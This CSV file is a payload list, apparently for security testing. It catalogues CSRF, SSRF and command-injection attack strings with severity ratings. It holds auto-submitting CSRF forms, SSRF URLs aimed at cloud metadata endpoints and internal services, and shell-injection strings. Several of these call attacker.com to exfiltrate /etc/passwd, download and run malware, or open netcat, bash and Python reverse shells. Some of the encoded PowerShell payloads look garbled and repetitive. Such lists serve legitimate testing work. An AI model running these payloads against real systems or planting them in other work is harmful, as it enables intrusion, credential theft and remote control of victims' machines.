id,attack_class,type,severity,context,payload_hash,payload
csrf-092,CSRF,CSRF,high,SVG embedded script,68a54d22a239,"<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>"
csrf-093,CSRF,CSRF,medium,Meta refresh with URL encoding,1ddb0160e716,<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>
csrf-094,CSRF,CSRF,high,JavaScript URL with obfuscation,98d606f14aa4,"<a href=""javascript:(function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})()"">Click me</a>"
csrf-095,CSRF,CSRF,high,Image onerror event trigger,ca8178732f68,"<img src='invalid.jpg' onerror=""var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();"" style='display:none'/>"
csrf-096,CSRF,CSRF,high,Unicode escape obfuscation,b69e96363488,<script>var a=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
csrf-097,CSRF,CSRF,high,CSS expression injection,26f386fd9d43,"<div style=""width:expression((function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})())""></div>"
csrf-098,CSRF,CSRF,critical,XHR POST request,232cedbaec17,"<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>"
csrf-099,CSRF,CSRF,medium,CSS animation event trigger,21e05cac9c3a,<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>
csrf-100,CSRF,CSRF,high,Array join obfuscation,bc59107aef30,"<script>var s=['ht','tp','s:','//','target','.com','/api','/evil'].join('');var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>"
ssrf-001,SSRF,SSRF,high,Access internal localhost service,62fe3d14ea42,http://127.0.0.1/
ssrf-002,SSRF,SSRF,high,Access internal network device,8d48b5cec922,http://192.168.1.1/
ssrf-003,SSRF,SSRF,critical,AWS EC2 instance metadata,0ccb496127f4,http://169.254.169.254/latest/meta-data/
ssrf-004,SSRF,SSRF,critical,Google Cloud metadata,f8c69287173b,http://metadata.google.internal/computeMetadata/v1/
ssrf-005,SSRF,SSRF,critical,Azure VM metadata,796ae8c91e31,http://169.254.169.254/metadata/instance?api-version=2021-02-01
ssrf-006,SSRF,SSRF,high,Access internal Redis,0c132b8c3ace,redis://127.0.0.1:6379
ssrf-007,SSRF,SSRF,high,Access internal Memcached,de1b6ca8dc83,memcached://127.0.0.1:11211
ssrf-008,SSRF,SSRF,medium,Access internal FTP,bfe654ddc625,ftp://127.0.0.1/
ssrf-009,SSRF,SSRF,high,Access internal SMB share,2fd035c88018,smb://192.168.1.100/share
ssrf-010,SSRF,SSRF,critical,Access Docker API,8a1c379f5b04,http://127.0.0.1:2375/containers/json
ssrf-011,SSRF,SSRF,critical,Access Kubernetes API,f8f779d5d4b5,https://kubernetes.default.svc/api
ssrf-012,SSRF,SSRF,high,Access Jenkins API,97693c4ef422,http://127.0.0.1:8080/api/json
ssrf-013,SSRF,SSRF,high,Access Elasticsearch,d71b8f9e7c11,http://127.0.0.1:9200/_cat/indices?v
ssrf-014,SSRF,SSRF,high,Access RabbitMQ API,b594334c1baa,http://127.0.0.1:15672/api/overview
ssrf-015,SSRF,SSRF,high,Access MySQL service,356e8478166d,mysql://127.0.0.1:3306
ssrf-016,SSRF,SSRF,high,Access PostgreSQL service,d02b5d638f4c,postgresql://127.0.0.1:5432
ssrf-017,SSRF,SSRF,medium,Access SMTP server,2450835d1da6,smtp://127.0.0.1:25
ssrf-018,SSRF,SSRF,medium,Access SNMP service,000b2aa09110,snmp://127.0.0.1
ssrf-019,SSRF,SSRF,high,Access LDAP service,085bd1b27a25,ldap://127.0.0.1:389
ssrf-020,SSRF,SSRF,critical,Attempt path traversal via SSRF,938674c1f82d,http://127.0.0.1/../../../../etc/passwd
ssrf-021,SSRF,SSRF,high,URL encoded internal IP,9bad7fee4158,http://%31%39%32.%31%36%38.%31.%31/
ssrf-022,SSRF,SSRF,high,Octal encoded IP address,518dea0c82da,http://0300.0250.0001.0001/
ssrf-023,SSRF,SSRF,high,Decimal encoded IP address,f61cb43c10b4,http://3232235777/
ssrf-024,SSRF,SSRF,high,IPv6 localhost,7b94047a04f1,http://[::1]/
ssrf-025,SSRF,SSRF,critical,Local file read attempt,859bc9ce6ccf,file:///etc/passwd
ssrf-026,SSRF,SSRF,critical,Gopher protocol to Redis,dfdd93482255,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A
ssrf-027,SSRF,SSRF,medium,Data URI with embedded script,13f2a258354a,"data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4="
ssrf-028,SSRF,SSRF,low,JavaScript URI scheme,796a98e66cd9,javascript:alert('SSRF')
ssrf-029,SSRF,SSRF,critical,Access process environment,431c7b6b2994,file:///proc/self/environ
ssrf-030,SSRF,SSRF,critical,Nested URL encoded path traversal,72566526b494,http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd
ssrf-031,SSRF,SSRF,critical,FTP directory traversal,d614dff071e5,ftp://127.0.0.1/../../../../etc/passwd
ssrf-032,SSRF,SSRF,critical,SMB UNC path traversal,ccf474e317bb,smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts
ssrf-033,SSRF,SSRF,critical,HTTP request smuggling,75ff28e44c99,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
ssrf-034,SSRF,SSRF,critical,HTTP header injection,4aa3696444ec,"http://127.0.0.1:80/
X-Injected-Header: evil"
ssrf-035,SSRF,SSRF,high,Basic auth credentials,4a4e8179f0e0,http://admin:password@127.0.0.1/admin
ssrf-036,SSRF,SSRF,high,Redirect to internal IP,6c22c177996b,http://external.com/redirect?url=http://127.0.0.1/
ssrf-037,SSRF,SSRF,critical,DNS rebinding to internal IP,6c289c319f49,http://evil.com/
ssrf-038,SSRF,SSRF,high,IPv4 mapped IPv6,f6b0c0ebfa4f,http://[::ffff:127.0.0.1]/
ssrf-039,SSRF,SSRF,medium,Encoded newline injection,84fb97637f5e,http://127.0.0.1/%0a%0d
ssrf-040,SSRF,SSRF,medium,Method override parameter,2750f61f3651,http://127.0.0.1/?_method=POST
ssrf-041,SSRF,SSRF,medium,Chunked transfer encoding test,0aceb6cec5e5,http://127.0.0.1/chunked
ssrf-042,SSRF,SSRF,medium,HTTP TRACE method test,6341b598d178,http://127.0.0.1/trace
ssrf-043,SSRF,SSRF,medium,HTTP OPTIONS method test,612fdea3de13,http://127.0.0.1/options
ssrf-044,SSRF,SSRF,medium,HTTP CONNECT method test,2c2d82a397d7,http://127.0.0.1/connect
ssrf-045,SSRF,SSRF,medium,HTTP PATCH method test,9314eba0699a,http://127.0.0.1/patch
ssrf-046,SSRF,SSRF,medium,HTTP DELETE method test,16b4155740fa,http://127.0.0.1/delete
ssrf-047,SSRF,SSRF,medium,HTTP PUT method test,69b52c3c771a,http://127.0.0.1/put
ssrf-049,SSRF,SSRF,high,Inject X-Forwarded-For header,2cf0c00f6820,"http://127.0.0.1/
X-Forwarded-For: 127.0.0.1"
ssrf-050,SSRF,SSRF,high,Userinfo section in URL,742ab006740c,http://127.0.0.1@evil.com/
ssrf-051,SSRF,SSRF,medium,Access internal dictionary service,a5f70a213be4,dict://127.0.0.1/
ssrf-052,SSRF,SSRF,medium,Access internal telnet service,ccec8fc49e2b,telnet://127.0.0.1:23
ssrf-053,SSRF,SSRF,high,LDAP query,fb6a5c0e38e6,"ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid"
ssrf-054,SSRF,SSRF,medium,Access internal RDP service,9743c6c32741,rdp://127.0.0.1:3389
ssrf-055,SSRF,SSRF,high,Access SMB share,c03ec07b8842,smb://127.0.0.1/share
ssrf-056,SSRF,SSRF,medium,Access NFS export,f7768a36543e,nfs://127.0.0.1/export
ssrf-057,SSRF,SSRF,medium,Access IMAP mail server,970919f0ec61,imap://127.0.0.1:143
ssrf-058,SSRF,SSRF,medium,Access POP3 mail server,c64dc6992b92,pop3://127.0.0.1:110
ssrf-059,SSRF,SSRF,medium,Access MQTT broker,a774abdc613f,mqtt://127.0.0.1:1883
ssrf-060,SSRF,SSRF,medium,Access WebSocket service,d36841f5d00b,ws://127.0.0.1:8080/
ssrf-061,SSRF,SSRF,medium,Access secure WebSocket service,175bc5eb15bb,wss://127.0.0.1:8443/
ssrf-062,SSRF,SSRF,low,Bitcoin protocol scheme,ca78a2bf0323,bitcoin://127.0.0.1/
ssrf-063,SSRF,SSRF,low,Magnet link protocol,4bec6d1b0b11,magnet:?xt=urn:btih:abcdef1234567890
ssrf-064,SSRF,SSRF,medium,Access SSH service,088f006225a9,ssh://127.0.0.1:22
ssrf-065,SSRF,SSRF,low,Telephone protocol,e2cc04f5e443,tel:+1234567890
ssrf-066,SSRF,SSRF,low,SMS protocol,43de510d9327,sms:+1234567890
ssrf-067,SSRF,SSRF,low,Geolocation protocol,02d406a26fad,"geo:37.786971,-122.399677"
ssrf-068,SSRF,SSRF,medium,Subversion protocol,74469a1bfbed,svn://127.0.0.1/repo
ssrf-069,SSRF,SSRF,medium,Git protocol,67c083986f75,git://127.0.0.1/repo.git
ssrf-070,SSRF,SSRF,medium,Secure FTP protocol,d889bcfc0543,sftp://127.0.0.1/home/user/
ssrf-071,SSRF,SSRF,high,Double URL encoded IP,efb165297d51,http://%2531%25327%2532%253E%253E%253E/
ssrf-072,SSRF,SSRF,medium,Mixed case HTTP scheme,62fe3d14ea42,HtTp://127.0.0.1/
ssrf-073,SSRF,SSRF,high,Null byte injection,ae39726cc744,http://127.0.0.1%00.example.com/
ssrf-074,SSRF,SSRF,critical,CRLF injection,dbe16bb66d83,"http://127.0.0.1/
Set-Cookie:evil=1"
ssrf-076,SSRF,SSRF,high,IPv6 embedded IPv4 with port,6f017e66023e,http://[::ffff:192.168.1.1]:8080/
ssrf-078,SSRF,SSRF,critical,HTTP header injection,1163998e8f06,http://127.0.0.1/%0d%0aX-Injected-Header:evil
ssrf-080,SSRF,SSRF,critical,File read with null byte,83b1991daf08,file:///etc/passwd%00
ssrf-081,SSRF,SSRF,high,Basic auth with encoding,7b97d9f731b0,http://admin%3Apassword@127.0.0.1/
ssrf-091,SSRF,SSRF,high,Hexadecimal IPv4 address,59687893da22,http://0x7f.0x0.0x0.0x1/
ssrf-092,SSRF,SSRF,high,Shortened IPv4 address,6027c1badb94,http://127.1/
ssrf-093,SSRF,SSRF,high,Integer IPv4 address,058658e148ad,http://2130706433/
ssrf-095,SSRF,SSRF,low,URL fragment,f1a2dbf552a1,http://127.0.0.1/#fragment
ssrf-096,SSRF,SSRF,low,Query parameter,9e634a51eaaa,http://127.0.0.1/?param=value
ssrf-098,SSRF,SSRF,critical,URL encoded path traversal,96e19deada8f,http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd
ssrf-099,SSRF,SSRF,critical,Encoded double slash,c20ffbb23e01,http://127.0.0.1/%2f%2f/etc/passwd
ssrf-100,SSRF,SSRF,critical,Mixed encoding and case path traversal,ba4594a4f8a1,http://%31%32%37.%30.%30.%31/%2E%2E/%2e%2e/%2E%2e/etc/passwd
cmdinj-001,CmdInj,Command Injection,high,Inject list directory command,a82ab998bb6d,; ls -la
cmdinj-002,CmdInj,Command Injection,critical,Inject read passwd file,60394bb36bc7,&& cat /etc/passwd
cmdinj-003,CmdInj,Command Injection,high,Inject whoami command,62ecaae15141,| whoami
cmdinj-004,CmdInj,Command Injection,high,Inject id command using backticks,87ea5dfc8b8e,id
cmdinj-005,CmdInj,Command Injection,high,Inject uname command,9cf74c097a4f,$(uname -a)
cmdinj-006,CmdInj,Command Injection,high,Nested command substitution,aff5db5d5997,$(echo $(whoami))
cmdinj-007,CmdInj,Command Injection,medium,Inject sleep command for timing attack,6eb16ef1e705,& sleep 10
cmdinj-008,CmdInj,Command Injection,high,Inject command with newline,948d33efe864,"&& echo 'injected'
"
cmdinj-009,CmdInj,Command Injection,critical,Exfiltrate data via curl,5a650351cbf2,; curl http://attacker.com
cmdinj-010,CmdInj,Command Injection,critical,Download and execute malware,aa1ed8ef8403,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh
cmdinj-011,CmdInj,Command Injection,critical,Reverse shell via netcat,b73cfa3ec6d6,| nc attacker.com 4444 -e /bin/sh
cmdinj-012,CmdInj,Command Injection,high,Execute whoami command,ef4957ec5768,whoami
cmdinj-013,CmdInj,Command Injection,high,Execute id command,ef5e57fa8bef,$(id)
cmdinj-014,CmdInj,Command Injection,medium,Simple echo injection,b75015d5f402,; echo injected
cmdinj-015,CmdInj,Command Injection,critical,Read shadow file,ec7d3c46bb42,&& cat /etc/shadow
cmdinj-016,CmdInj,Command Injection,high,Execute id command,714a1f2fc42f,; id
cmdinj-017,CmdInj,Command Injection,medium,Print environment variables,2de02fe0fef8,| env
cmdinj-018,CmdInj,Command Injection,high,List root directory,93fff531bb41,ls /
cmdinj-019,CmdInj,Command Injection,medium,List running processes,6925954660ca,$(ps aux)
cmdinj-020,CmdInj,Command Injection,high,Execute whoami command,694ba4ac233a,; whoami
cmdinj-021,CmdInj,Command Injection,high,URL encoded semicolon and id command,b0fb89a6d990,%3B%20id
cmdinj-022,CmdInj,Command Injection,high,Nested backticks execution,7f9b7878d0fd,`echo \whoami\`
cmdinj-023,CmdInj,Command Injection,medium,Print current user environment variable,e12a7d4e275e,; echo $USER
cmdinj-024,CmdInj,Command Injection,medium,Hex encoded space character,6af6f3b1ddc5,; echo\x20injected
cmdinj-025,CmdInj,Command Injection,critical,Base64 encoded reverse shell,c9144bb59892,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash
cmdinj-026,CmdInj,Command Injection,medium,Timing attack with sleep,ff19c7eee198,$(sleep 10)
cmdinj-027,CmdInj,Command Injection,high,Nested command substitution,e3b6ed9c1cfb,; echo $(whoami)
cmdinj-028,CmdInj,Command Injection,medium,Escape semicolon,4b43832be9a4,; echo injected\; ls
cmdinj-029,CmdInj,Command Injection,high,Multiple command chaining,ebe48780b67d,; ls -la && whoami || echo failed
cmdinj-030,CmdInj,Command Injection,high,Grouped commands,93efc8d78f67,; (id; uname -a)
cmdinj-031,CmdInj,Command Injection,medium,Subshell with sleep,533f8e6949dc,; (sleep 5)
cmdinj-032,CmdInj,Command Injection,medium,Command injection with comment,8c3d17183825,; ls -la #
cmdinj-033,CmdInj,Command Injection,high,Nested command execution,3a8a258d4349,echo $(whoami)
cmdinj-034,CmdInj,Command Injection,medium,Print PATH environment variable,ef41be86de21,; echo $PATH
cmdinj-035,CmdInj,Command Injection,medium,Echo injected string,c8bab688e96b,$(echo injected)
cmdinj-036,CmdInj,Command Injection,high,Multiple commands in subshell,c65f102b19af,; (echo injected; whoami)
cmdinj-037,CmdInj,Command Injection,medium,Timing attack,7050692ef64e,; sleep 15
cmdinj-040,CmdInj,Command Injection,critical,Download and execute script,152c39e36ae4,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh
cmdinj-042,CmdInj,Command Injection,medium,Set environment variable,928f9c3a614c,; export MALICIOUS=1
cmdinj-043,CmdInj,Command Injection,medium,Write to file,ae9fdde0a31f,; echo 'malicious' > /tmp/malicious.txt
cmdinj-044,CmdInj,Command Injection,medium,Change file permissions,09fc5bc3c14f,; chmod +x /tmp/m.sh
cmdinj-045,CmdInj,Command Injection,critical,Read shadow file,f9a8b04e531b,; cat /etc/shadow
cmdinj-046,CmdInj,Command Injection,medium,Echo with special characters,a71aec286e64,; echo 'injected; ls -la'
cmdinj-047,CmdInj,Command Injection,high,Nested command with quotes,a0d57fe40234,"; echo ""$(whoami)"""
cmdinj-048,CmdInj,Command Injection,high,Execute command via awk,306b11a2d24b,"; awk 'BEGIN {system(""id"")}'"
cmdinj-049,CmdInj,Command Injection,high,Execute command via perl,630db19f080a,; perl -e 'print id'
cmdinj-050,CmdInj,Command Injection,high,Execute command via python,fdbf38f7f927,"; python -c 'import os; os.system(""id"")'"
cmdinj-051,CmdInj,Command Injection,high,Execute whoami command,f49b7cb55907,& whoami
cmdinj-052,CmdInj,Command Injection,high,List directory contents,d70b2c413b59,| dir
cmdinj-053,CmdInj,Command Injection,high,Display network config,71dd74741e85,&& ipconfig
cmdinj-054,CmdInj,Command Injection,high,List users,75fddf25f914,|| net user
cmdinj-055,CmdInj,Command Injection,high,List running processes,cf8a4bce998c,; Get-Process
cmdinj-057,CmdInj,Command Injection,high,List directory contents,c11e80b7c7a3,$(Get-ChildItem)
cmdinj-058,CmdInj,Command Injection,medium,Launch notepad,0061bba3d9d7,; Start-Process notepad.exe
cmdinj-059,CmdInj,Command Injection,medium,Write to file,eb561b86db7a,& echo injected > C:\Windows\Temp\injected.txt
cmdinj-060,CmdInj,Command Injection,critical,Reverse shell,0b6e60d42906,& nc attacker.com 4444 -e cmd.exe
cmdinj-062,CmdInj,Command Injection,high,Execute id,f1125ace3b36,| id
cmdinj-063,CmdInj,Command Injection,high,System info,6af27c9bd533,&& uname -a
cmdinj-069,CmdInj,Command Injection,high,Encoded PowerShell command,9b9ca04120ea,; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=
cmdinj-070,CmdInj,Command Injection,medium,Loop command,8152eac4676d,"& for /L %i in (1,1,5) do @echo %i"
cmdinj-071,CmdInj,Command Injection,high,Execute command,51c92419e714,; Invoke-Expression 'whoami'
cmdinj-072,CmdInj,Command Injection,medium,Print environment variables,f00322c1842f,; env
cmdinj-073,CmdInj,Command Injection,critical,Read passwd file,eae687bfdc7b,; cat /etc/passwd
cmdinj-074,CmdInj,Command Injection,medium,Query registry,b1e053ed520f,& reg query HKLM\Software
cmdinj-075,CmdInj,Command Injection,high,Read hosts file,2aa54be1cdb7,; Get-Content C:\Windows\System32\drivers\etc\hosts
cmdinj-076,CmdInj,Command Injection,medium,Kernel messages,657ae5eab438,; dmesg
cmdinj-077,CmdInj,Command Injection,medium,Network connections,aec9bd9f59ed,; netstat -an
cmdinj-078,CmdInj,Command Injection,medium,List running tasks,13c9d34037ba,& tasklist
cmdinj-079,CmdInj,Command Injection,medium,List services,b2a8b4654612,; Get-Service
cmdinj-080,CmdInj,Command Injection,medium,List processes,a59f22319d69,; ps aux
cmdinj-081,CmdInj,Command Injection,medium,Echo and filter output,d3fefbccdf30,& echo injected | findstr injected
cmdinj-082,CmdInj,Command Injection,medium,Launch process hidden,3bc4a061c6a5,; Start-Process notepad.exe -WindowStyle Hidden
cmdinj-083,CmdInj,Command Injection,critical,Exfiltrate data via curl,c7f5ff9d079d,; curl http://attacker.com/?data=$(cat /etc/passwd)
cmdinj-084,CmdInj,Command Injection,high,Encoded PowerShell payload,8c95c6e9c474,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA
cmdinj-085,CmdInj,Command Injection,critical,Reverse shell via netcat,48b251e88420,; nc attacker.com 4444 -e /bin/bash
cmdinj-086,CmdInj,Command Injection,critical,Download and execute file,50a2485b3e86,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe
cmdinj-087,CmdInj,Command Injection,critical,Reverse shell via bash,f110826db702,; bash -i >& /dev/tcp/attacker.com/4444 0>&1
cmdinj-088,CmdInj,Command Injection,critical,Download and execute PowerShell script,7cbc0454d2c2,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1
cmdinj-089,CmdInj,Command Injection,critical,Reverse shell via python,b78f75a23d45,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'"
cmdinj-090,CmdInj,Command Injection,critical,Encoded PowerShell reverse shell,26308b1bcfa3,& powershell -EncodedCommand SQBFAFgAUABMAGUAYQBjAGgAIABbAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQ==
cmdinj-091,CmdInj,Command Injection,high,Bypass simple filters using ${IFS} (space) variable,9bb881b77709,; e${IFS}cho injected
cmdinj-093,CmdInj,Command Injection,high,Double URL encoded semicolon and id,113cc530473c,%253B%2520id
cmdinj-094,CmdInj,Command Injection,high,Use variable to execute command,f649e1f35f6b,; VAR=whoami; $VAR
cmdinj-095,CmdInj,Command Injection,critical,Decode and execute base64 payload,04767991e893,; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
cmdinj-096,CmdInj,Command Injection,high,Use newline as command separator,dd10bf6ed0a4,"&& echo injected
id"
cmdinj-097,CmdInj,Command Injection,critical,Obfuscated PowerShell encoded command,cdaac6c94300,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA
cmdinj-098,CmdInj,Command Injection,high,Nested command substitution with quotes,a3880cf6fb97,"; echo $(echo ""$(whoami)"")"
cmdinj-099,CmdInj,Command Injection,high,Indirect command execution via env var,f90ecb687fae,; export CMD=whoami; ${CMD}
